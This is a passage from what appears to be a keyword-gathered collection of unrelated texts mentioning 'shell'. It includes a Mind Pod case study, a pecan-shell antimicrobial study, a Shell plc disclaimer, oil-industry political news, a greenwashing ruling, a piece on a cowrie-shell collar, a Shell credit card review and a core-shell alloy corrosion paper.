their stress level before exiting the Mind Pod. In total, the full experience lasts approximately five minutes.\n\n\u201c We\u2019re grateful that Shell Point trusted Red Dot to tailor the Mind Pod experience in a way that delivers a valuable experience for their residents, visitors and employees. Shell Point staff now have daily visibility into how the Mind Pod is being used, with daily email reporting that shows which pieces of video content are impacting users most positively. Furthermore, the templates we developed ensure that future content updates can be made by internal staff, without having to engage outside technical resources.\u201c\n\n\u2013 Darryl Kuder, President of Red Dot Digital Media\n\nShell Point engaged Red Dot to customize the Mind Pod workflow and give them a way to measure and report on the Mind Pod\u2019s positive impact on employees, residents and guests. This included updating the hardware configuration to include a 32-inch Bluefin touchinteractive display with BrightSign Built-In. The convenience of having BrightSign media player capabilities integrated into the display streamlined the hardware layout and ensured interoperability. Red Dot, which does extensive integration within the BrightSign ecosystem, chose to use the Wallboard content management system (CMS) for its versatility, and the ability to bypass programming in HTML to reduce the development timeline and ultimately reduce the cost to Shell Point.\n\nAdditionally, Red Dot was able to templatize the layout such that future updates can be made by Shell Point IT personnel without the time and expense of engaging outside consultants. Another reason for engaging Red Dot was to create a reporting system to provide quantitative feedback on the Mind Pod\u2019s positive impact. Shell Point staff now receive daily emails that show how many people use the Mind Pod each day, and which videos were viewed during each visit. And because individuals are asked to measure their stress levels upon entering and leaving the Mind Pod, Shell Point can also see which videos are having the most measurable, positive impact on its residents, staff and visitors.\n\n\u201c We developed this experiential, innovative, real-time therapeutic environment to de-escalate anxiety, and we\u2019re thrilled to report the immersive sanctuary-like enclosure is already showing positive results in its current location at Shell Point.\u201c\n\n\u2013 Cara Hewett and Tracy Zboril Mind Pod Co-Founders\n\nResults: The Mind Pod has been extremely well received not only by staff, but by residents and visitors alike. Beyond the therapeutic benefits, staff have remarked that simply having the Mind Pod centrally located in the lobby is a visual reminder that they have convenient access to a tool that effectively and positively impacts their mental health. Participants rate their stress level upon entering the Mind Pod and again after experiencing videos within the enclosure. Family care-givers measured stress levels decreasing an average of 27%, while staff members experienced a decrease of approximately 20%. This measurable and immediate impact demonstrates that the Mind Pod is improving the mental well-being of those who live and work at Shell Point.\n\nTagged Red Dot Digital Media\n\nPost navigation",

A study in the Journal of Food Science published by the Institute of Food Technologists (IFT) showed that extracts from pecan shells may be effective at protecting meats, such as chicken from listeria growth.\n\n\n\nUnroasted and roasted organic pecan shells were subjected to organic extraction processes to produce antimicrobials that were tested against Listeria spp. and L. monocytogenes bacteria. The effectiveness of pecan shell extracts were further tested using poultry skin to see how much these extracts inhibited bacterial growth of Listeria.\n\n\n\nWhen this all-natural antimicrobial was tested on raw chicken skin it decreased the levels of pathogens by 100 times and at the same time reduced the levels of spoilage organisms by more than 1,000 times, thus greatly increasing the shelf life of the chicken. The researchers concluded that the natural pecan shell extracts may prove to be an effective alternative antimicrobial against food pathogens and supplement the demand for organic antimicrobials.\n\n\n\nRead the abstract in the Journal of Food Science here.",

There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this media release, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell\u2019s products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cyber security breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this media release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc\u2019s Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this media release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this media release, 23 January 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this media release.\n\nShell\u2019s Net Carbon Intensity\n\nAlso, in this media release we may refer to Shell\u2019s \u201cNet Carbon Intensity\u201d (NCI), which includes Shell\u2019s carbon emissions from the production of our energy products, our suppliers\u2019 carbon emissions in supplying energy for that production and our customers\u2019 carbon emissions associated with their use of the energy products we sell. Shell\u2019s NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell\u2019s \u201cNet Carbon Intensity\u201d or NCI is for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell\u2019s net-zero emissions target\n\nShell\u2019s operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell\u2019s operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell\u2019s operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-Looking non-GAAP measures\n\nThis media release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc\u2019s consolidated financial statements.\n\nThe contents of websites referred to in this media release do not form part of this media release.\n\nWe may have used certain terms, such as resources, in this media release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\n\n\n",

            "content": "In April, President Donald Trump had requested that Big Oil spend $1 billion to help him win the 2024 election.\n\nA new report details how fossil fuel executives helped finance President Donald Trump\u2019s 2024 election win, spending millions of dollars to influence the race in his favor.\n\nThe report from Climate Power, a progressive group dedicated to \u201cwinning the politics of climate,\u201d suggests that Big Oil\u2019s donations to Trump \u2014 coupled with hundreds of millions of dollars spent on lobbying Congress over the past year \u2014 will majorly increase profits for the industry.\n\n\u201cBig Oil\u2019s total financial influence this election cycle amounts to an astounding $445 million,\u201d the report states, noting that the oil and gas industries also donated to dark money groups in support of Republicans and Trump that make it \u201cnearly impossible to understand the full scope of their impact\u201d over the past year.\n\nOf the money that has been disclosed, $96 million went directly to Trump\u2019s presidential campaign. That\u2019s about one-tenth of the amount Trump requested from Big Oil executives during a secretive meeting at his Mar-a-Lago estate in April, when he begged executives to give his campaign $1 billion and vowed to enact policies to increase their profits in return.\n\nAnother $80 million from oil and gas companies went to advertising to support Trump and Republicans, or toward positive advertisements for the industry during the election cycle. And a whopping $243 million was spent on lobbying members of Congress last year, the Climate Power report shows.\n\nThe investment from these companies is \u201clikely to pay dividends\u201d for them, the report suggests, in the form of deregulation of the industries and new drilling permits, among other actions by the administration.\n\n\u201cWhile Trump has deceptively claimed he is declaring an \u2019emergency\u2019 to produce more energy and lower costs, his first actions actually aim to crush some of America\u2019s most abundant energy supplies \u2014 because his agenda is geared toward maximizing oil industry profits rather than American energy production,\u201d the report states. \u201cThe only way for the U.S. to truly become a global energy superpower is to free ourselves from Big Oil\u2019s grip and invest in the clean energy of the future.\u201d\n\nIn his first week in office, Trump has already issued numerous executive orders that favor the fossil fuel industry, including:\n\nDeclaring a \u201cnational emergency\u201d on energy, aimed at increasing domestic energy production;\n\nRescinding Biden administration restrictions on drilling in Alaska, as well as off the east and west coasts;\n\nRestarting liquefied natural gas (LNG) terminal approvals, which had been paused under the Biden White House;\n\nAnd rolling back Environmental Protection Agency (EPA) emission standards.\n\nTrump\u2019s cabinet and advisory positions within the White House have also been stacked with Big Oil representatives and their allies.\n\nGreenpeace\u2019s Gujari Singh condemned Trump\u2019s executive orders, noting that they \u201creveal everything we need to know about where his administration\u2019s loyalties lie,\u201d and that they \u201creflect the priorities of his major donors, not the American public.\u201d\n\n\u201cDuring his campaign, Trump openly requested $1 billion from Big Oil. Executive orders like declaring a \u2018national energy emergency\u2019 and rubber stamping more [liquefied natural gas] exports are the prize \u2014 a quid pro quo \u2014 rewarding those who financed his political rise,\u201d Singh wrote.\n\nUnlike mainstream media, we\u2019re not capitulating to Trump. As a dizzying number of corporate news organizations \u2013 either through need or greed \u2013 rush to implement new ways to further monetize their content, and others acquiesce to Trump\u2019s wishes, now is a time for movement media-makers to double down on community-first models.

            "content": "Dive Brief:\n\nA state judge has dismissed a lawsuit filed by New York City seeking to hold Big Oil accountable for alleged greenwashing practices and its role in exacerbating climate change, per a ruling issued last week.\n\nState Supreme Court Justice Anar Patel wrote in her Jan. 14 decision New York City had failed to demonstrate that the defendants named in its suit \u2014 ExxonMobil, Shell, BP and the American Petroleum Institute \u2014 had deceived consumers about the climate impact of their fossil fuel products.\n\nPatel\u2019s dismissal stated that the city could not claim New Yorkers were \u201cclimate conscious\u201d and sensitive to the connection between fossil fuels and climate change, but were \u201cmisled\u201d by oil and gas companies\u2019 failure to disclose how their fossil fuel products contributed to it.\n\nDive Insight:\n\nThe state judge said that as the city has previously alleged \u201cthere is near universal consensus that global warming is primarily caused, or at least accelerated, by the burning of fossil fuels,\u201d it cannot \u2014 at the same time \u2014 say its consumers were \u201cduped\u201d by oil and gas companies\u2019 failure to disclose that \u201ctheir fossil fuel products \u2026 contribute to climate change.\u201d\n\n\u201cThe City cannot have it both ways,\u201d Patel wrote in her ruling.\n\nThe state judge\u2019s ruling also said the city had not \u201csufficiently pled\u201d how Big Oil misled consumers with marketing campaigns by showing support for clean energy and alternative energy sources, and called the alleged greenwashing statements \u201cinactionable.\u201d Patel added some of the alleged greenwashing statements highlighted by New York City were \u201cdistortions\u201d of original statements or had been taken out of context.\n\nPatel also argued that some of the alleged greenwashing statements did not fall under the state\u2019s consumer protection statutes as they consisted of language that was aspirational, opinionated or exaggerated.\n\n\u201cNo reasonable consumer would be misled by these subjective, nonspecific, and vague statements,\u201d Patel wrote.\n\nThe New York City Law Department told ESG Dive it was disappointed with last week\u2019s ruling and was reviewing its legal options.\n\n\u201cOur complaint alleged that these defendants spent millions to mislead consumers to think that they, and their products, contribute to a clean energy future. They do not,\u201d a spokesperson for the law department said in an emailed statement Wednesday. \u201cCompanies that violate the city\u2019s consumer protection laws should be held fully accountable. New Yorkers deserve no less.\u201d\n\nThe city filed the suit in a state court in April 2021, shortly after a federal appeals court rejected its bid to hold five oil and gas companies \u2014 Exxon, Shell, BP, Chevron and ConocoPhillips \u2014 accountable for causing climate-linked damages, such as global warming.\n\nNew York\u2019s suit against Big Oil is one of at least 86 climate cases filed against fossil fuel producers since 2015, according to a report from Oil Change International and Zero Carbon Analytics. The report also found that the annual number of climate-related lawsuits filed against the world\u2019s largest fossil fuel producing companies has nearly tripled since the Paris Agreement was adopted a decade ago. Companies facing litigation include Shell, BP, Chevron and ExxonMobil.\n\nThe suit is also one of many initiated by states, cities and municipalities \u2014 from California to Chicago and Honolulu \u2014 looking to hold Big Oil accountable for its role in spurring climate change and related natural disasters.\n\nShell declined to comment on the ruling. ExxonMobil did not provide a comment as of press time.",

Jackson wore a large, distinctive collar made of rows of cowrie shells. (Photo by Chip Somodevilla/Getty Images)\n\nWas there a deeper meaning behind U.S. Supreme Court Justice Ketanji Brown Jackson\u2019s neckwear choice at the inauguration for President Donald Trump?\n\nAtop her judicial robe, Jackson wore a large, distinctive collar made of rows of cowrie shells\u2014which come from sea snails and have long been part of African culture, according to HuffPost and Ebony.\n\nAs a fashion statement, there was some disagreement. Josh Blackman, a professor at the South Texas College of Law in Houston, initially called the cowrie shells a \u201cfashion faux pas,\u201d while fashion historian Shelby Ivey Christie said the piece had undeniable visual impact.\n\nThe shell collar \u201cbrilliantly reinterprets the traditional judicial jabot through an African American cultural lens,\u201d Christie told HuffPost. The shell pattern suggests \u201cceremony and significance\u201d along with \u201cimportance and intentionality,\u201d she said.\n\nBut there may have been a deeper meaning, according to HuffPost, Vogue, Ebony, the Root, Parade, Above the Law and a Volokh Conspiracy post by Blackman.\n\nThe shells once served as currency in Africa, Asia and the Pacific Islands, and they convey prosperity, Christie said. They are sometimes thought to have protective properties, including protection from enslavement, and to be conduits of ancestral wisdom. They are also associated with womanhood and fertility.\n\nThose multiple meanings led Vogue to see the collar as possibly \u201ca sartorial expression of her dissent,\u201d with a nod to Justice Ruth Bader Ginsburg. The late justice was known for her dissent collars, worn when she dissented and when she arrived at the court the day after Trump\u2019s first election in 2016.\n\nBlackman is troubled by the possibility of a talisman meaning. Even if Jackson didn\u2019t intend to convey a message that she was protecting herself from evil, \u201cthere is clearly the (literal) appearance of impropriety,\u201d he wrote at the Volokh Conspiracy.",

            "content": "The Shell Fuel Rewards credit card, issued by Citi, has no annual fee and provides an immediate discount each time you top off your tank at Shell. You can also earn fuel rebates for nonfuel purchases, but those rebates come with restrictions and an expiration date.\n\nEven if you\u2019re a road warrior, you should leave this card in the garage and consider a more general rewards credit card that earns a bonus at gas stations.\n\nHere are five things to know about the Shell credit card.\n\n1. There are two versions of the card\n\nLike many brand-specific retail cards, the Shell Fuel Rewards credit card comes in two flavors:\n\nThe Shell Fuel Rewards Card: This is a \"closed-loop\" card, meaning it can only be used at Shell.\n\nThe Shell Fuel Rewards Mastercard: This is an open-loop card that can be used anywhere Mastercard is accepted.\n\nIf you apply for the Mastercard version but lack the credit history to qualify, Citi will automatically use that application to consider you for the closed-loop version.\n\nTravel Rewards Expert Reveals... Why this is her top credit card for dining rewards, and she shows you exactly how she realizes more than $1,000 in value from it each year. Click for details\n\n2. It earns discounts on current and future fuel purchases\n\nHolders of either card will receive Gold Status in the Shell Fuel Rewards program and earn an immediate discount at the pump. Nonfuel purchases earn rewards in the form of fuel rebates that are automatically applied as a statement credit each month against fuel purchases at Shell.\n\nThe rewards structure of the card includes:\n\nA 5-cent discount for each gallon you purchase as a Gold Status member.\n\nA 5-cent discount for each gallon you purchase as a cardholder.\n\n10% back in fuel rebates on the first $1,200 in nonfuel purchases at Shell.\n\n2% back in fuel rebates for grocery store and restaurant purchases, up to $10,000 in combined spending per calendar year (Mastercard version only).\n\n1% back in fuel rebates on all other purchases (Mastercard version only).\n\nDiscounts and fuel rebates are issued on up to 35 gallons per purchase, and fuel rebates expire 12 months after they are earned.\n\nAs of this writing, both versions of the card also come with an introductory offer, marketed as earning 30 cents back per gallon on your first five fuel purchases, up to 35 gallons, at Shell \u2014 25 cents for being a cardholder and 5 cents for having Gold Status. But you don\u2019t have to be a cardholder to earn Gold Status (see No. 3 below), and the card already earns 5 cents per gallon for being a cardholder, so this benefit is really worth an extra 20 cents per gallon. Even if you maximize the offer by buying exactly 35 gallons on five occasions, this offer would be worth only $35 and well below the value you should strive for with a sign-up bonus.\n\nNerdWallet rating NerdWallet's ratings are determined by our editorial team. The scoring formula incorporates coverage options, customer experience, customizability, cost and more. Learn More\n\nAdditionally, while 10% back on nonfuel purchases at Shell is a healthy rebate, you\u2019d have to consume a lot of Cheetos and soda to really maximize that benefit. If you qualify for the Mastercard version of the card, the 2% back on grocery and restaurant purchases sounds better. But several other $0-annual-fee credit cards earn 2% back on all purchases, not just in narrow categories, and those rewards come as true cash back and without an expiration date.\n\nMost people will be better off with a general rewards card like the Citi Custom Cash\u00ae Card. It earns 5% cash back on up to $500 spent in your highest spend category per billing cycle, from a list of eligible options that includes gas (1% back on all other purchases). At that rate, you could earn $25 back on gas every month, or $300 per year. There's also a handsome sign-up bonus: Earn $200 in cash back after you spend $1,500 on purchases in the first 6 months of account opening. This bonus offer will be fulfilled as 20,000 ThankYou\u00ae Points, which can be redeemed for $200 cash back.\n\nNerdWallet rating NerdWallet's ratings are determined by our editorial team. The scoring formula incorporates coverage options, customer experience, customizability, cost and more. Learn More\n\nOr consider the Wells Fargo Autograph\u00ae Card, which earns an unlimited 3x rewards for every dollar spent on gas, travel, restaurants, transit and cell phone plans. Points are worth a penny each when redeemed for cash back, and those rewards don't expire as long as your card is open. It also comes with the following sign-up bonus: Earn 20,000 bonus points when you spend $1,000 in purchases in the first 3 months - that's a $200 cash redemption value.\n\n3. You don\u2019t need the card to earn Gold Status\n\nYou can join the Shell Fuel Rewards program for free without being a cardholder and get instant Gold Status for six months. That means anyone can earn an everyday 5-cent-per-gallon discount at the pump. You can maintain Gold Status by fueling up six times (minimum of 5 gallons per visit) at a Shell station within each subsequent three-month period; otherwise, you\u2019ll drop to Silver Status and earn a 3-cent-per-gallon discount.\n\nSince anyone can get that Gold Status discount, the value proposition for being a cardholder is really only a 5-cent-per-gallon discount.\n\n4. You're locked into refueling at Shell\n\nBecoming a Shell Fuel Rewards cardholder will force you to seek out a Shell station if you want to earn a discount at the pump or use your fuel rebates. This could be bad for your wallet in situations where another station has cheaper gas. Being tied to Shell may also prevent you from using a gas app like Upside to shop around and get the best price or discount available when you top off your tank.\n\n5. The APR is sky-high\n\nYou won\u2019t want to finance fuel purchases made with the Shell Fuel Rewards card. The card\u2019s annual percentage rate is 31.24% as of the time of this writing, much higher than the average rate.\n\nIf you do need to consider financing purchases of everything including gas, the Blue Cash Everyday\u00ae Card from American Express offers a 0% intro APR for 15 months on purchases and balance transfers, and then the ongoing APR of 18.24%-29.24% Variable APR. It also earns 3% cash back on purchases at gas stations and supermarkets in the U.S. (on up to $6,000 in spending annually per category) and comes with the following welcome offer: Earn a $200 statement credit after you spend $2,000 in purchases on your new Card within the first 6 months.

            "content": "X-ray diffraction\n\nFigure 2 shows the X-ray diffraction results, with the main characteristic peaks of Al-12Si and FACS corresponding to Al and Si. This indicates that no new phases were generated during ball milling and hot extrusion. The diffuse scattering peaks of Fe amorphous particles are clearly present around 43\u00b0, this indicates the presence of an amorphous phase in the FACS, confirming that the Fe amorphous particles remained amorphous and were not transformed into crystals during the processes. They remain in the amorphous state, which retains good passivation properties, thereby contributing to the enhanced corrosion resistance of the material.\n\nMicrostructure\n\nFigure 3 optical micrographs show that Fe amorphous particles with a round, ball-like structure are embedded in the Al-12Si matrix, with evident pores on the matrix surface. The surfaces of FACS samples with Fe amorphous particle doping at 2%, 5%, and 10% are smooth and flat, with rounded, well-packed Fe amorphous particles tightly enclosed within the Al-12Si matrix, displaying no bonding defects such as gaps, thus forming a typical core-shell structure. This suggests good wettability between the Fe amorphous particles and Al-12Si. At a doping content of 20%, however, pores appear on the FACS surface, and the Fe amorphous particles are fragmented, leading to bonding surface defects.\n\nFigure 4 shows the microstructure and elemental distribution, the Al-12Si alloy revealing small amounts of Si crystals and flakes. The dominant elements are Al and Si, with minor amounts of Mg, Cu, Fe, and Mn uniformly distributed (Fig. 4a). In the FACS doped with Fe amorphous particles, the Fe amorphous particles are encapsulated by Al elements in the matrix, forming a unique amorphous/crystalline core-shell structure with Al-12Si. Specifically, in the FACS with 2% and 5% Fe doping, broken Si crystals and sheets are prominently present, and the Fe amorphous particles are larger with a lower dispersion effect (Fig. 4b, c). In contrast, the FACS with 10% Fe doping shows a significant refinement of the Si crystals, a more uniform elemental distribution, and smaller Fe amorphous particle sizes, which often indicates a denser microstructure and better corrosion resistance (Fig. 4d). In the FACS with 20% Fe amorphous particle doping content, the aggregation of Fe amorphous particles is much higher than that in the FACS with 10% Fe amorphous particle doping content (Fig. 4e). This suggests that an excessive amount of Fe amorphous particles leads to agglomeration, which results in an uneven distribution of the cores and reduces the corrosion resistance of the core-shell structure material23.\n\nA suitable amount of Fe amorphous particles act as the core during the extrusion process, serving as \u201cball bearings\u201d to increase the fluidity of the shell elements (Al-12Si). The uniform distribution of elements, along with the high dispersion of Si crystals and Fe amorphous particles, helps to prevent the formation of local potential differences, making the potential on the alloy surface more uniform, thereby reducing the risk of galvanic corrosion.\n\nFig. 3 Optical micrographs: (a) Al-12Si; (b) 2%Fe; (c) 5%Fe; (d) 10%Fe; (e) 20%Fe. Full size image\n\nFig. 4 Microstructure and elemental distribution: (a) Al-12Si; (b) 2% Fe; (c) 5% Fe; (d) 10% Fe; (e) 20% Fe. Full size image\n\nRelative density\n\nTable 3 shows the relative density calculations for Al-12Si and FACS, indicating that none of the specimens are fully densified. FACS with 2%, 5%, and 10% Fe amorphous particles have higher relative densities than Al-12Si, while the relative density of FACS decreases at 20% Fe amorphous particle content. These results correspond to the changes in microstructural pores and agglomeration defects observed in Fig. 3a\u2013e. The good fluidity of spherical Fe amorphous particles allows them to fill the tiny pores of the Al-12Si matrix during extrusion molding. However, when the Fe amorphous particle doping content reaches 20%, the excessive doping particles compress and friction against each other, resulting in decreased flowability and the formation of agglomeration defects.\n\nTable 3 Al-12Si and FACS relative densities. Full size table\n\nCorrosion performance\n\nPotentiodynamic polarization\n\nAfter immersing Al-12Si and FACS in the corrosive agent and reaching a stable OPC, the Tafel curves were measured as shown in Fig. 5. The analysis indicates that the FACS potentiodynamic polarization curve resembles that of Al-12Si, with no passivation or over-passivation of Fe amorphous particles observed. This could be due to the highly acidic nature of the corrosive agent, which accelerates the corrosion dissolution reaction, preventing the passivation layer\u2019s influence on the material from being detected24. However, the FACS cathodic potentiodynamic polarization curve with 2\u201310% Fe amorphous particle doping content is significantly lower than that of the Al-12Si alloy corrosion current density. This indicates that in FACS with an appropriate amount of Fe amorphous particle doping, the passivation ability of Fe amorphous particles effectively suppresses the cathodic hydrogen evolution reaction, reduces stress corrosion, and consequently lowers the corrosion rate.\n\nThe cathodic potentiodynamic polarization curves exhibit a distinct Tafel linear region, indicating activation-controlled reactions at the working electrode. Thus, Tafel linear extrapolation25 was used to fit the potentiodynamic polarization curves, as shown in Table 4, which includes self-corrosion current density (i corr ) and self-corrosion potential (E corr ). As the Fe amorphous doping content increased from 2 to 10%, the i corr of FACS decreased from 246.59 \u00b5A/cm2 to 114.98 \u00b5A/cm2, both lower than that of Al-12Si alloy (i corr 254.66 \u00b5A/cm2). Additionally, the E corr of FACS increased from 779.41 mV to 794.78 mV, both higher than that of Al-12Si alloy. Lower i corr and higher E corr correspond to a lower corrosion rate, indicating that Fe amorphous particles effectively enhance the corrosion resistance of Al-12Si alloy. On one hand, the Fe amorphous particles facilitate the formation of a passive film, and both the Fe amorphous particles and their passive layer act as an inert barrier, which is beneficial for enhancing corrosion resistance26. On the other hand, the higher activation energy of Fe amorphous particles compared to Al-12Si, which hinders electron transfer and reduces electrochemical kinetics19. Furthermore, Fe amorphous particles replace a portion of the Si and act as cathodes, further reducing the electron transfer rate and decreasing the cathodic reaction. As a result, the self-corrosion current density decreases, and the self-corrosion potential increases, which corresponds to a reduction in the corrosion rate. However, when the Fe amorphous particles doping content increased to 20%, the formation of agglomeration defects and increased porosity led to a higher specific surface area exposed to the corrosive agent, exacerbating the corrosion rate. Consequently, the i corr rose to 344.34 \u00b5A/cm2, and the E corr dropped to 761.80 mV, decreasing the corrosion resistance of the Al-12Si alloy.\n\nFig. 5 Tafel curves of Al-12Si and FACS. Full size image\n\nTable 4 Electrochemical characterization of potentiodynamic polarization curves for Al-12Si and FACS. Full size table\n\nElectrochemical impedance spectroscopy\n\nThe Nyquist plots of Al-12Si and FACS electrochemical impedance spectroscopy shown in Fig. 6 feature capacitive loops at high and medium frequencies and inductive loops at low frequencies, indicating two corrosion processes. The rough surface of the aluminum electrode creates a dispersion effect27, resulting in an approximately elliptical capacitive loop rather than a complete semicircle. A larger semicircular capacitive loop resistance suggests that, during corrosion, aluminum loses electrons and transforms into Al3+ within the double electric layer at the alloy-solution interface. The capacitive loop provides charge transfer impedance, and its diameter represents the polarization resistance; greater polarization resistance implies stronger impedance to charge transfer and better corrosion resistance16. The inductive loop at low frequencies is associated with the corrosion reaction and oxide film at the metal/solution interface. Water molecules and Cl\u2212 ions interact with the metal surface, causing instability due to Cl\u2212 penetration and adsorption, leading to the formation of an inductive loop from the impedance of transient reaction intermediates28.\n\nThe electrochemical impedance spectroscopy parameters obtained from fitting the Nyquist plot using the equivalent circuit shown in Fig. 6 are listed in Table 5. The circuit includes components such as solution resistance (R \u00b5 ), charge transfer resistance (R ct ), inductive resistance (R L ), inductance (L), and constant phase element (CPE), representing the capacitance between electrodes, used to replace ideal capacitors. According to Table 5, as the doping content of Fe amorphous particles in FACS increases from 2 to 10%, the polarization resistance (R ct ) increases from 548.5 \u03a9\u00b7cm2 to 1268 \u03a9\u00b7cm2, higher than that of Al-12Si at 353.2 \u03a9\u00b7cm2. However, when the Fe amorphous particles doping content reaches 20%, the polarization resistance of FACS decreases to 297.3 \u03a9\u00b7cm2. This indicates that doping with 2\u201310% Fe amorphous particles enhances the polarization resistance of Al-12Si. The higher inductance (L) values in Fe amorphous particle-doped FACS compared to Al-12Si suggest that corrosion predominantly occurs on the surface rather than deep within the alloy6, implying a smaller coverage of corrosion products on the surface of FACS than Al-12Si. The parameters of the CPE include Admittance Absolute Value (Y 0 ) and diffusion coefficient (n). With Fe amorphous particles doping content increasing from 2 to 10%, Y 0 increases and n decreases for FACS, indicating improved surface capacitive behavior and better stability of the original surface protective oxide film. However, when Fe amorphous particles doping content reaches 20%, Y 0 decreases and n increases, suggesting deteriorated surface capacitive behavior and reduced stability of the oxide film.\n\nThe changes in the electrochemical impedance spectroscopy parameters are attributed to the effect of Fe amorphous particle doping. The strong corrosion resistance and high relative density due to moderate doping reduced the reaction area between Al and HCl and prevented the corrosive agent from penetrating the alloy\u2019s depth, thus mitigating corrosion. Additionally, this doping improved the stability of the oxide film on the surface, effectively enhancing the corrosion resistance of the Al-12Si alloy.\n\nFig. 6 Nyquist plot of Al-12Si and FACS. Full size image\n\nTable 5 Nyquist curve parameters for Al-12Si and FACS. Full size table\n\nCorrosion pattern\n\nFigure 7 shows the corrosion surface morphology after 168 h of immersion in the corrosive agent, indicating that intergranular corrosion, pitting, stress corrosion, and exfoliation corrosion occurred in both Al-12Si and FACS. At higher i corr , the Al-12Si alloy surface was severely eroded, forming many fine cavities (Fig. 7a). This erosion likely results from the anodic dissolution of the matrix around the grains at the grain boundaries29, which then develops into grain boundary corrosion. This corrosion gradually propagates to deeper levels, forming large and deep surface pits. Fine particles formed by corrosion products adsorb on the surface, and intergranular corrosion creates irregular pits surrounding the aluminum grains, known as pitting. Further corrosion, involving Cl\u2212 and the Al matrix, produces a hydrogen precipitation reaction causing stress corrosion cracking. Intergranular corrosion and pitting connect to form a network, leading to surface layer spalling, which exposes new matrix areas to react with HCl, causing transverse and longitudinal expansion of pits, ultimately leading to larger pits.\n\nThe surface of 2% Fe amorphous particle-doped FACS shows wide and deep cracks, covered with large cracked flakes, Exfoliation corrosion is lighter than Al-12Si (Fig. 7b), indicating mainly grain boundary and pitting corrosion. The 5% Fe amorphous particle-doped FACS surface has narrow, shallow cracks, with large, thin cracked flakes and shallow pits, indicating limited stress corrosion penetration (Fig. 7b). The 10% Fe amorphous particle-doped FACS surface is the flattest, with light grain-boundary corrosion crevices and a few pitting pits (Fig. 7d), showing reduced corrosion. However, the 20% Fe amorphous particle-doped FACS surface resembles that of Al-12Si alloy, with grain boundary corrosion, pitting, and exfoliation corrosion, along with agglomerated Fe amorphous particles and a small amount of white flocculent corrosion products (Fig. 7e).\n\nThe reason for this is that in the FACS with 2\u201310% Fe amorphous particle doping, the dispersed Fe amorphous particles form a core-shell structure with Al-12Si, improving the relative density and reducing the intergranular corrosion pathways caused by pores and other defects. On the other hand, the corrosion-resistant Fe amorphous particles, with their passivation effect, reduce local voltage differences, generating a physical barrier to corrosion and hindering the penetration of corrosive agents. This enhances the ability of Al-12Si alloys to resist intergranular corrosion, stress corrosion, and exfoliation corrosion. The Al-12Si alloy surface is distributed with pores, which provide channels for corrosive media to invade the metal substrate. Corrosive media can easily penetrate through these pores into the material, forming localized electrochemical corrosion regions. Pores not only increase the exposed surface area of the substrate but also potentially lead to the occurrence of intergranular corrosion, thereby promoting pitting formation and further accelerating the corrosion process. When the doping content of Fe amorphous particles reaches 20%, the amorphous agglomeration leads to uneven microstructure and local structural defects, which may become preferential sites for corrosion, triggering intergranular corrosion. Meanwhile, the agglomeration phenomenon causes uneven potential, increasing local potential differences and forming highly reactive areas, which in turn promotes galvanic corrosion. Therefore, the corrosion resistance of Al-12Si alloys and FACS with 20% Fe amorphous particle doping is relatively weak.\n\nFig. 7 SEM analysis of corrosion surface morphology after 168 h immersion in corrosive agent: (a) Al-12Si; (b) 2% Fe; (c) 5% Fe; (d) 10% Fe; (e) 20% Fe. Full size image\n\nCorrosion product\n\nFigure 8 presents the SEM-EDS analysis results of the corrosion products after immersion in the corrosive agent for 168 h. Al-12Si surfaces exposed to air typically form a 0.01\u20130.1 \u03bcm thick Al 2 O 3 passivation film, which is highly susceptible to corrosion in aggressive environments, losing its protective effect. During the electrochemical corrosion process, Si acts as the cathode and remains protected. When active elements and unstable phases dissolve, they create deep corrosion channels in the alloy. The reaction 2Al + 6HCl \u2192 2AlCl 3 + 6H 2 occurs as HCl wraps around Al. Further corrosion forms a mixture of Al-Si fine particles (Fig. 8a No. 2, b No. 1, c No. 3, d No. 2), due to significant Al dissolution and the exposure of cathodic Si. The FACS with 10% Fe amorphous particles shows significantly fewer fine particles compared to Al-12Si and FACS with 20% Fe amorphous particles, indicating a lower degree of corrosion. As Al continues to dissolve and flake off, only large Si particles remain 